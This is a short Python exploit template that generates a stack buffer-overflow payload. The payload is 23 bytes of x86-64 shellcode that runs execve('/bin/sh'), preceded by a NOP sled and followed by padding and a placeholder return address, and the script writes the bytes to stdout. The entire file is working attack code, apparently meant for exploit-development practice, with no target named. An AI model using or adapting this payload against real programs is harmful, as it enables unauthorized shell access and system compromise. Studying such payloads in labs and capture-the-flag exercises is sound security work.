#!/usr/bin/python3
# shellcode_injection_template.py
# Shellcode: 23 Bytes
import sys
import binascii
from itertools import repeat
CODE = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
CODE += "\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
# NOP slide: 100 Byte - 23 Byte = 77 Byte
NOP = repeat(0x90, 77)
# Padding: 120 Byte - 100 Byte = 20 Byte
PAD = repeat(0x41, 20)
# Instruction Pointer
RIP = "CHANGE-ME"
RIP = binascii.unhexlify(RIP)
payload = bytearray()
payload.extend(NOP)
payload.extend(CODE.encode('latin-1'))
payload.extend(PAD);
payload.extend(RIP);
sys.stdout.buffer.write(payload)
#xdd
